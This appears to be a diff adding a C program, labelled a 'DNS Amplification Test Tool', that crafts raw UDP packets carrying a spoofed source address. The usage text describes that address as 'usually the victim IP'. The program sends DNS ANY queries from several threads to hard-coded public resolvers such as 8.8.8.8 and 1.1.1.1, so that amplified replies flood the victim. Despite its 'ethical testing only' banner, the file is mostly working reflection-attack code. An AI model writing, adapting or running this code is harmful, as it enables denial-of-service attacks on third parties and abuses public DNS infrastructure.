@@ -1,0 +1,287 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <getopt.h>
+#include <time.h>
+#include <sys/socket.h>
+#include <netinet/ip.h> 
+#include <netinet/udp.h>
+#include <arpa/inet.h>
+#include <errno.h>
+#include <pthread.h>  // For multi-threading
+// ─────────────────────────────────────────────────────────────────────────────
+// DNS Amplification Test Tool (ETHICAL TESTING ONLY)
+// WARNING: For authorized security testing / research only.
+// Unauthorized use is illegal in most jurisdictions.
+// ─────────────────────────────────────────────────────────────────────────────
+#define DEFAULT_PACKET_COUNT    10
+#define DEFAULT_DELAY_MS        100
+#define MAX_PACKET_SIZE         4096
+#define MAX_THREADS             4  // Max number of threads for packet sending
+// Define the packet_data structure
+struct packet_data {
+    int count;
+    int delay_ms;
+    int start_packet;
+    int sock;
+    const char *spoof_ip;
+    const char *target_ip;
+    const char *domain;
+};
+// Simple checksum (IP/UDP)
+unsigned short in_cksum(unsigned short *buf, int len) {
+    unsigned long sum = 0;
+    while (len > 1) {
+        sum += *buf++;
+        len -= 2;
+    }
+    if (len == 1)
+        sum += *(unsigned char *)buf;
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    return (unsigned short)(~sum);
+};
+// Pseudo-header used for UDP checksum calculation
+struct pseudo_header {
+    uint32_t source;
+    uint32_t dest;
+    uint8_t  zero;
+    uint8_t  protocol;
+    uint16_t udp_len;
+} __attribute__((packed));
+// Standard DNS header
+struct dns_header {
+    uint16_t id;
+    uint16_t flags;
+    uint16_t qdcount;
+    uint16_t ancount;
+    uint16_t nscount;
+    uint16_t arcount;
+} __attribute__((packed));
+// DNS question footer
+struct dns_question {
+    uint16_t qtype;
+    uint16_t qclass;
+} __attribute__((packed));
+// Convert "example.com" → 0x07"example"0x03"com"0x00
+static int encode_dns_name(uint8_t *buf, const char *name) {
+    int pos = 0;
+    const char *ptr = name;
+    while (*ptr) {
+        const char *label_start = ptr;
+        while (*ptr && *ptr != '.') ptr++;
+        int len = ptr - label_start;
+        if (len == 0 || len > 63) return -1; // invalid label
+        buf[pos++] = (uint8_t)len;
+        memcpy(buf + pos, label_start, len);
+        pos += len;
+        if (*ptr == '.') ptr++;
+    }
+    buf[pos++] = 0; // root label
+    return pos;
+}
+static void print_usage(const char *progname) {
+    fprintf(stderr,
+        "\nDNS Amplification Test Tool (ethical testing / research only)\n\n"
+        "Usage: %s [options]\n\n"
+        "Required:\n"
+        "  -s, --spoof <IP>       Source IP to spoof (usually the victim IP)\n"
+        "  -d, --domain <name>    Domain name to query (ANY record)\n\n"
+        "Optional:\n"
+        "  -c, --count <n>        Number of packets to send (default: %d)\n"
+        "  -D, --delay <ms>       Delay between packets in milliseconds (default: %d)\n"
+        "  -h, --help             Show this help message\n\n"
+        "Example:\n"
+        "  sudo %s -s 192.168.1.50 -d isc.org -c 20 -D 80\n\n"
+        "Notes:\n"
+        "  • Must be run as root (raw sockets required)\n"
+        "  • Spoofed source IP should be the system you want reflected traffic sent to\n"
+        "  • Use only in environments you own or have explicit permission to test\n\n",
+        progname, DEFAULT_PACKET_COUNT, DEFAULT_DELAY_MS, progname);
+}
+// Gather DNS resolvers (you can expand this method later with a file)
+void gather_dns_resolvers(const char ***dns_servers) {
+    static const char *default_dns[] = {
+        "8.8.8.8",    // Google DNS
+        "1.1.1.1",    // Cloudflare DNS
+        "8.8.4.4",    // Google DNS
+        "9.9.9.9",    // Quad9 DNS
+        "1.0.0.1",    // Cloudflare DNS (alternate)
+        "208.67.222.222", // OpenDNS
+        NULL          // Null terminator for the list
+    };
+    *dns_servers = default_dns;
+}
+// Function to send packets (this is where the multi-threading will occur)
+void *send_packet(void *arg) {
+    struct sockaddr_in dest;
+    uint8_t packet[MAX_PACKET_SIZE];
+    memset(packet, 0, sizeof(packet));
+    // Extract thread-specific data from the argument
+    struct packet_data *data = (struct packet_data *)arg;
+    int count = data->count;
+    int delay_ms = data->delay_ms;
+    int start_packet = data->start_packet;
+    int sock = data->sock;
+    const char *spoof_ip = data->spoof_ip;
+    const char *domain = data->domain;
+    // Open list of DNS resolvers
+    const char **dns_servers;
+    gather_dns_resolvers(&dns_servers);
+    // Pick a random DNS server from the list
+    const char *target_ip = dns_servers[rand() % 6]; // Choose from the list of DNS servers
+    // Build the destination sockaddr_in structure
+    memset(&dest, 0, sizeof(dest));
+    dest.sin_family = AF_INET;
+    dest.sin_addr.s_addr = inet_addr(target_ip);
+    struct iphdr *ip = (struct iphdr *)packet;
+    struct udphdr *udp = (struct udphdr *)(packet + sizeof(*ip));
+    struct dns_header *dns = (struct dns_header *)(packet + sizeof(*ip) + sizeof(*udp));
+    uint8_t *qname = (uint8_t *)(dns + 1);
+    // Build DNS question
+    int name_len = encode_dns_name(qname, domain);
+    if (name_len < 0) {
+        fprintf(stderr, "Invalid domain name: %s\n", domain);
+        close(sock);
+        return NULL;
+    }
+    struct dns_question *q = (struct dns_question *)(qname + name_len);
+    q->qtype = htons(255); // ANY
+    q->qclass = htons(1);   // IN
+    int dns_len = sizeof(*dns) + name_len + sizeof(*q);
+    // UDP header
+    udp->source = htons(1024 + (rand() % (65535 - 1024))); // avoid well-known ports
+    udp->dest = htons(53);
+    udp->len = htons(sizeof(*udp) + dns_len);
+    udp->check = 0;
+    // DNS header
+    dns->id = 0; // will randomize per packet
+    dns->flags = htons(0x0100); // RD=1 standard query
+    dns->qdcount = htons(1);
+    dns->ancount = 0;
+    dns->nscount = 0;
+    dns->arcount = 0;
+    // IP header (most fields fixed)
+    ip->version = 4;
+    ip->ihl = 5;
+    ip->tos = 0;
+    ip->tot_len = htons(sizeof(*ip) + sizeof(*udp) + dns_len);
+    ip->frag_off = 0;
+    ip->ttl = 64 + (rand() % 30); // slight randomization
+    ip->protocol = IPPROTO_UDP;
+    ip->saddr = inet_addr(spoof_ip);
+    ip->daddr = dest.sin_addr.s_addr;
+    int packet_len = ntohs(ip->tot_len);
+    // Send packets
+    for (int i = start_packet; i < start_packet + (count / MAX_THREADS); i++) {
+        // Randomize per-packet fields
+        dns->id = htons(rand() & 0xFFFF);
+        ip->id = htons(rand() & 0xFFFF);
+        // IP checksum
+        ip->check = 0;
+        ip->check = in_cksum((uint16_t *)ip, sizeof(*ip));
+        // UDP checksum (pseudo-header + udp + payload)
+        struct pseudo_header psh = {
+            .source = ip->saddr,
+            .dest = ip->daddr,
+            .zero = 0,
+            .protocol = IPPROTO_UDP,
+            .udp_len = udp->len
+        };
+        uint16_t *buf = alloca(sizeof(psh) + ntohs(udp->len));
+        memcpy(buf, &psh, sizeof(psh));
+        memcpy((char *)buf + sizeof(psh), udp, ntohs(udp->len));
+        udp->check = 0;
+        udp->check = in_cksum(buf, sizeof(psh) + ntohs(udp->len));
+        // Transmit
+        if (sendto(sock, packet, packet_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
+            fprintf(stderr, "sendto failed: %s\n", strerror(errno));
+        } else {
+            // Detailed logging: DNS query ID and packet sending
+            printf("[+] Sent packet %3d | ID: %5u | src:%s → dst:%s:53\n",
+                   i, ntohs(dns->id), spoof_ip, target_ip);
+        }
+        // Optional delay between packets
+        if (i < count) {
+            usleep((delay_ms * 1000) + (rand() % 40) * 1000); // small jitter
+        }
+    }
+    return NULL;
+}
+int main(int argc, char **argv) {
+    char *spoof_ip = NULL;
+    char *domain = NULL;
+    int count = DEFAULT_PACKET_COUNT;
+    int delay_ms = DEFAULT_DELAY_MS;
+    int opt;
+    static struct option long_options[] = {
+        {"spoof", required_argument, 0, 's'},
+        {"domain", required_argument, 0, 'd'},
+        {"count", required_argument, 0, 'c'},
+        {"delay", required_argument, 0, 'D'},
+        {"help", no_argument, 0, 'h'},
+        {0, 0, 0, 0}
+    };
+    // Parse command-line arguments
+    while ((opt = getopt_long(argc, argv, "s:d:c:D:h", long_options, NULL)) != -1) {
+        switch (opt) {
+            case 's': spoof_ip = optarg; break;
+            case 'd': domain = optarg; break;
+            case 'c': count = atoi(optarg); break;
+            case 'D': delay_ms = atoi(optarg); break;
+            case 'h':
+            default:
+                print_usage(argv[0]);
+                return (opt == 'h') ? 0 : 1;
+        }
+    }
+    if (!spoof_ip || !domain || count < 1) {
+        fprintf(stderr, "Error: Missing required arguments (-s, -d)\n");
+        print_usage(argv[0]);
+        return 1;
+    }
+    if (delay_ms < 0) delay_ms = 0;
+    // Print test info
+    printf("[*] Starting DNS ANY amplification test\n");
+    printf("    Spoofed source : %s\n", spoof_ip);
+    printf("    Query domain   : %s (ANY)\n", domain);
+    printf("    Packet count   : %d\n", count);
+    printf("    Delay          : %d ms\n", delay_ms);
+    printf("───────────────────────────────────────\n");
+
+    srand(time(NULL) ^ getpid());
+
+    // Open raw socket
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sock < 0) {
+        perror("socket(AF_INET, SOCK_RAW, IPPROTO_RAW)");
+        return 1;
+    }
+    int one = 1;
+    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+        perror("setsockopt(IP_HDRINCL)");
+        close(sock);
+        return 1;
+    }
+    struct packet_data data[MAX_THREADS];
+    pthread_t threads[MAX_THREADS];
+    // Initialize thread data
+    for (int i = 0; i < MAX_THREADS; i++) {
+        data[i].count = count;
+        data[i].delay_ms = delay_ms;
+        data[i].start_packet = i * (count / MAX_THREADS);
+        data[i].sock = sock;
+        data[i].spoof_ip = spoof_ip;
+        data[i].domain = domain;
+        // Create threads to send packets
+        pthread_create(&threads[i], NULL, send_packet, (void *)&data[i]);
+    };
+    // Wait for threads to finish
+    for (int i = 0; i < MAX_THREADS; i++) {
+        pthread_join(threads[i], NULL);
+    };
+    // Close socket after all threads finish
+    close(sock);
+    return 0;
+}
